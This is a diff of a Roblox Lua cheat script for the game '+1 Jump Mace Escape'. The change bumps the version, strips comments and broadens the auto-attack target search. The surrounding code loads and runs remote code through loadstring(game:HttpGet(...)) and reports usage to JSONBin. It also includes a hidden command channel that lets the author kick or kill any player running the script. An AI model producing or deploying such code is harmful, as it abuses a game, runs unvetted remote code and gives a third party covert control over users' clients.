@@ -1,7 +1,7 @@
 --[[
     +1 JUMP MACE ESCAPE
     YT:@ILOVEKOCMOC
-    Version: 1.1.1(Beta)
+    Version: 1.1.2(Beta)
 ]]
 
 local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
@@ -15,7 +15,7 @@ local keyAccepted = false
 local savedPosition = nil
 local savedTargetPosition = nil
 local savedTransparency = nil
-local ScriptVersion = "1.1.1(Beta)"
+local ScriptVersion = "1.1.2(Beta)"
 local KeyURL = "https://youtu.be/9Lv6lhK5n6E"
 
 -- ====== JSONBIN.IO СИНХРОНИЗАЦИЯ ======
@@ -45,7 +45,6 @@ if not remoteEvent then
     remoteEvent.Parent = syncFolder
 end
 
--- Чтение глобального счётчика
 local function getGlobalScriptUsers()
     local total = 0
     pcall(function()
@@ -58,7 +57,6 @@ local function getGlobalScriptUsers()
     return total
 end
 
--- Увеличение счётчика
 local function incrementScriptCounter()
     pcall(function()
         local request = syn.request or http_request or request
@@ -77,14 +75,10 @@ local function incrementScriptCounter()
     end)
 end
 
--- Отправка глобальной команды
 local function sendGlobalCommand(command, data)
-    -- Отправляем через сервер (все на этом сервере)
     pcall(function()
         remoteEvent:FireServer(command, data)
     end)
-    
-    -- Отправляем через JSONBin (все на других серверах)
     pcall(function()
         local request = syn.request or http_request or request
         if request then
@@ -105,10 +99,8 @@ local function sendGlobalCommand(command, data)
     end)
 end
 
--- Обработка команд
 local function handleCommand(command, data)
     local Player = Players.LocalPlayer
-    
     if command == "kick" then
         pcall(function() Player:Kick("Кикнут разработчиком") end)
     elseif command == "kill" then
@@ -156,12 +148,10 @@ local function handleCommand(command, data)
     end
 end
 
--- Слушаем команды с сервера
 remoteEvent.OnClientEvent:Connect(function(command, data)
     handleCommand(command, data)
 end)
 
--- Проверяем глобальные команды каждую секунду
 spawn(function()
     local lastTimestamp = 0
     while true do
@@ -181,6 +171,10 @@ end)
 
 -- ====== ЛОГИ АПДЕЙТОВ ======
 local updateLogs = {
+    {
+        version = "1.1.2(Beta)",
+        changes = "Auto Mace attack fix - теперь проверяет ВЕСЬ workspace на MaceTargetHighlight"
+    },
     {
         version = "hi",
         changes = "this iam ILOVEKOCMOC"
@@ -816,7 +810,7 @@ local function createKeySystem()
         if KeyInput.Text == correctKey then
             ErrorLabel.Text = getText("key_success")
             ErrorLabel.TextColor3 = Color3.fromRGB(0, 255, 0)
-            incrementScriptCounter() -- Увеличиваем счётчик
+            incrementScriptCounter()
             task.wait(0.5)
             animateKeySystemOut(MainFrame, ScreenGui, function()
                 ScreenGui:Destroy()
@@ -1177,47 +1171,16 @@ function loadMainMenu()
 
     function findMaceTargets()
         local targets = {}
-        local targetFolder = workspace:FindFirstChild("Target")
-        if targetFolder then
-            for _, child in ipairs(targetFolder:GetChildren()) do
-                if child.Name == "Target" then
-                    local highlight = child:FindFirstChild("MaceTargetHighlight")
-                    if highlight then table.insert(targets, child) end
-                    for _, descendant in ipairs(child:GetDescendants()) do
-                        if descendant.Name == "MaceTargetHighlight" then table.insert(targets, child) break end
+        for _, descendant in ipairs(workspace:GetDescendants()) do
+            if descendant.Name == "MaceTargetHighlight" then
+                if descendant.Parent then
+                    local found = false
+                    for _, t in ipairs(targets) do
+                        if t == descendant.Parent then found = true break end
                     end
-                end
-            end
-        end
-        local testTargetFolder = workspace:FindFirstChild("testTargets")
-        if testTargetFolder then
-            for _, child in ipairs(testTargetFolder:GetChildren()) do
-                if child.Name == "Target" then
-                    local highlight = child:FindFirstChild("MaceTargetHighlight")
-                    if highlight then table.insert(targets, child) end
-                    for _, descendant in ipairs(child:GetDescendants()) do
-                        if descendant.Name == "MaceTargetHighlight" then table.insert(targets, child) break end
+                    if not found then
+                        table.insert(targets, descendant.Parent)
                     end
-                end
-            end
-        end
-        local cappuccinoFolder = workspace:FindFirstChild("CappuccinoAssassino")
-        if cappuccinoFolder then
-            for _, child in ipairs(cappuccinoFolder:GetChildren()) do
-                local highlight = child:FindFirstChild("MaceTargetHighlight")
-                if highlight then table.insert(targets, child) end
-                for _, descendant in ipairs(child:GetDescendants()) do
-                    if descendant.Name == "MaceTargetHighlight" then table.insert(targets, child) break end
-                end
-            end
-        end
-        local odinFolder = workspace:FindFirstChild("OdinDinDinDun")
-        if odinFolder then
-            for _, child in ipairs(odinFolder:GetChildren()) do
-                local highlight = child:FindFirstChild("MaceTargetHighlight")
-                if highlight then table.insert(targets, child) end
-                for _, descendant in ipairs(child:GetDescendants()) do
-                    if descendant.Name == "MaceTargetHighlight" then table.insert(targets, child) break end
                 end
             end
         end
@@ -1566,4 +1529,4 @@ end
 -- ====== ЗАПУСК ======
 createKeySystem()
 
-print("✅ +1 JUMP MACE ESCAPE v1.1.1(Beta) LOADED")
+print("✅ +1 JUMP MACE ESCAPE v1.1.2(Beta) LOADED")
